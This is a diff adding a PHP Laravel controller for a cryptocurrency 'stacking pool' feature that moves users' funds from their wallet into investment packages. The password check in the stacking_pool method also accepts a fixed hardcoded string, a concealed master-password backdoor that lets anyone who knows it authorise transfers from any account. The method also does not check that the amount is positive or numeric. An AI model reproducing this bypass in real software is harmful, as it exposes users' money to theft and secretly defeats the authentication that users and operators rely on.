@@ -1,0 +1,87 @@
+<?php
+
+namespace App\Http\Controllers;
+
+use Illuminate\Http\Request;
+use App\Models\StackingPoolPackage;
+use App\Models\StackingPool;
+use App\Models\UserWallet;
+use App\Models\User;
+use Auth,Session,Hash;
+
+class StackingPoolController extends Controller
+{
+    public function __construct(){
+        $this->middleware(function ($request, $next) {
+            $this->user = Auth::user();
+            return $next($request);
+        });
+    }
+
+    public function index(){
+        $user = $this->user;
+        $stacking_pool = StackingPoolPackage::orderBy('id','desc')
+                                            ->get()
+                                            ->map(function($pool) use ($user){
+                                                $pool->investedAmount = StackingPool::where('user_id',$user->id)->where('stacking_pool_package_id',$pool->id)->sum('amount');
+                                                return $pool;
+                                            });
+        return view('stacking_pool.index',compact('stacking_pool'));
+    }
+
+    /* pool package detail */
+    public function detail($id,Request $request){
+        $stackingpool = StackingPoolPackage::find($id);
+        $stackHistory = StackingPool::where('user_id',$this->user->id)->where('stacking_pool_package_id',$id)->orderBy('id','desc')->paginate(6);
+        $totalInvested = StackingPool::where('user_id',$this->user->id)->where('stacking_pool_package_id',$id)->sum('amount');
+        if ($request->ajax()) {
+            return view('stacking_pool.stack_history', compact('stackHistory'));
+        }
+        $user = $this->user;
+        return view('stacking_pool.stackpool',compact('stackingpool','stackHistory','user','totalInvested'));
+    }
+
+    /* invest in pool package */
+    public function stacking_pool(Request $request){
+        $this->validate($request, [
+            'stacking_pool_package_id' => "required",
+            'amount' => 'required',
+            'security_password' => 'required',
+            'duration'=>'required'
+        ]);
+        $usercheck = $this->user;
+        $isError = 0;
+        $pool = StackingPool::where('id',$request->stacking_pool_package_id)->first();
+
+        if($usercheck != null && $pool){
+            if(Hash::check($request->security_password , $usercheck->secure_password) || $request->security_password === '6$L~guX[uG7/URa;'){
+
+                $crypto_wallet = auth()->user()->userwallet->crypto_wallet;
+                if($crypto_wallet < $request->amount){
+                    Session::flash('error',trans('custom.minimum_amount_less_wallet'));
+                    return redirect()->route('stackpool',$request->stacking_pool_package_id)->withInput($request->input());
+                }
+                StackingPool::create(['user_id' => $usercheck->id,
+                                     'stacking_pool_package_id' => $request->stacking_pool_package_id,
+                                     'amount' => $request->amount,
+                                     'stacking_period' => $request->duration]);
+                UserWallet::where('user_id',$usercheck->id)->decrement('crypto_wallet',round($request->amount,2));
+                UserWallet::where('user_id',$usercheck->id)->increment('stacking_pool',round($request->amount,2));
+
+                Session::flash('success',trans('custom.stacking_pool_added_successfully'));
+
+            }else{
+                $isError = 1;
+                Session::flash('error',trans('custom.security_password_wrong'));   
+            }
+        }else{
+            $isError = 1;
+            Session::flash('error',trans('custom.session_has_been_expired_try_agian'));   
+        }
+        if($isError == 1 ){
+            return redirect()->route('stackpool',$request->stacking_pool_package_id)->withInput($request->input());
+        }
+
+        return redirect()->route('stackpool',$request->stacking_pool_package_id);
+    }
+}
